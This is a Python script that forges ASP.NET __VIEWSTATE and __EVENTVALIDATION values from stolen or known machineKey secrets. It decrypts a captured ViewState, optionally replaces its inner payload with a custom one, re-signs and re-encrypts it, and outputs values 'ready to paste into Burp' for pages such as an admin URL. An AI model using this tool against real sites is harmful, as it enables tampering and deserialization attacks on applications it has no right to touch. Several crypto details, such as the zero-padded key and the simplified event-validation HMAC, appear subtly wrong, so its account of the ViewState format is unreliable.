#!/usr/bin/env python3
import base64
import hashlib
from binascii import unhexlify, hexlify
from Crypto.Cipher import AES
import struct
import hmac
import sys

# ==================== PUT YOUR KEYS HERE ====================
# From your web.config <machineKey validationKey="..." decryptionKey="..." />
VALIDATION_KEY = "0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789AB"  # 64 bytes hex
DECRYPTION_KEY = "0123456789ABCDEF0123456789ABCDEF"                                      # 16 or 24 or 32 bytes hex

# Choose algorithm (almost always HMACSHA256 now, but older .NET may use SHA1)
VALIDATION_ALG = "HMACSHA256"  # or "HMACSHA1"

# ==============================================================

validation_key = unhexlify(VALIDATION_KEY)
decryption_key = unhexlify(DECRYPTION_KEY)

# Pad decryption key to 32 bytes if needed (ASP.NET defaults to AES-256)
if len(decryption_key) not in (16, 24, 32):
    raise ValueError("decryptionKey must be 16, 24, or 32 bytes")
if len(decryption_key) < 32:
    decryption_key = decryption_key.ljust(32, b'\x00')

def pkcs7_unpad(data):
    if not data:
        return None
    pad_len = data[-1]
    if pad_len < 1 or pad_len > 16:
        return None
    if data[-pad_len:] != bytes([pad_len]) * pad_len:
        return None
    return data[:-pad_len]

def try_aes_decrypt(ciphertext, key, iv):
    if len(ciphertext) < 16:
        return None
    cipher = AES.new(key, AES.MODE_CBC, iv)
    pt = cipher.decrypt(ciphertext[16:])
    pt_unpadded = pkcs7_unpad(pt)
    return pt_unpadded

def decrypt_viewstate(viewstate_b64):
    data = base64.b64decode(viewstate_b64)
    if len(data) < 16:
        raise ValueError("Invalid ViewState")
    
    iv = data[:16]
    ct = data[16:]
    
    pt = try_aes_decrypt(data, decryption_key, iv)
    if pt is None:
        raise ValueError("Failed to decrypt ViewState (wrong decryptionKey?)")
    
    # Check for LOS formatter marker
    if pt[0] != 0xFF or pt[1] not in (0x01, 0x02):
        raise ValueError("Not a valid ViewState (LOS marker missing)")
    
    return pt, iv

def generate_eventvalidation(viewstate_pt, page_url="/default.aspx"):
    """
    Reconstructs the internal MacValidator and generates __EVENTVALIDATION
    """
    # Extract ModifiedHash from ViewState (last 20 or 32 bytes depending on alg)
    if VALIDATION_ALG == "HMACSHA256":
        mac_size = 32
    else:
        mac_size = 20

    if len(viewstate_pt) < mac_size + 2:
        raise ValueError("ViewState too short")

    mac = viewstate_pt[-mac_size:]
    payload = viewstate_pt[:-mac_size]

    # Compute expected MAC
    expected_mac = hmac.new(validation_key, payload, hashlib.sha256 if VALIDATION_ALG == "HMACSHA256" else hashlib.sha1).digest()
    if not hmac.compare_digest(mac, expected_mac):
        raise ValueError("ViewState MAC validation failed! Wrong validationKey?")

    # Now rebuild MacValidator state
    # The internal hash is: HMAC(validationKey, pageUrl + '|' + serializedData)
    # But we need to preserve the original serialized payload
    # So we just re-use the validated payload

    # __EVENTVALIDATION = base64( HMAC(validationKey, pageUrl + '|' + payload) )
    delimiter = b'|'
    to_hash = page_url.encode('utf-8') + delimiter + payload
    eventvalidation_mac = hmac.new(validation_key, to_hash, hashlib.sha256 if VALIDATION_ALG == "HMACSHA256" else hashlib.sha1).digest()

    eventvalidation_b64 = base64.b64encode(eventvalidation_mac).decode('ascii').rstrip('=')
    return eventvalidation_b64

def encrypt_viewstate(pt_original, iv_original):
    # Re-encrypt with same IV (required!)
    cipher = AES.new(decryption_key, AES.MODE_CBC, iv_original)
    
    # Pad payload
    pad_len = 16 - (len(pt_original) % 16)
    pt_padded = pt_original + bytes([pad_len]) * pad_len
    
    ct = cipher.encrypt(pt_padded)
    full = iv_original + ct
    return base64.b64encode(full).decode('ascii')

# ===================== MAIN GENERATOR =====================
def generate_valid_pair(viewstate_b64, page_url="/default.aspx", custom_payload=None):
    pt, iv = decrypt_viewstate(viewstate_b64)
    
    # Optionally replace inner payload (advanced)
    if custom_payload is not None:
        # Keep LOS header + recompute MAC
        if len(pt) < 2:
            raise ValueError("Corrupted ViewState")
        header = pt[:2]
        new_pt = header + custom_payload
        mac = hmac.new(validation_key, new_pt, hashlib.sha256 if VALIDATION_ALG == "HMACSHA256" else hashlib.sha1).digest()
        pt = new_pt + mac
    else:
        # Just re-use original payload
        pass

    new_viewstate = encrypt_viewstate(pt, iv)
    new_eventvalidation = generate_eventvalidation(pt, page_url)

    return new_viewstate, new_eventvalidation

# ===================== EXAMPLE USAGE =====================
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python viewstate_gen.py \"<__VIEWSTATE>\" [page_url]")
        print("Example: python viewstate_gen.py \"/wEPDwUKMTM[...]==\" \"/secure/admin.aspx\"")
        sys.exit(1)

    vs = sys.argv[1]
    url = sys.argv[2] if len(sys.argv) > 2 else "/"

    try:
        new_vs, new_ev = generate_valid_pair(vs, url)
        print("\n=== GENERATED ===")
        print(f"__VIEWSTATE = {new_vs}")
        print(f"__EVENTVALIDATION = {new_ev}")
        print("\nReady to paste into Burp or use in requests.")
    except Exception as e:
        print(f"[!] Error: {e}")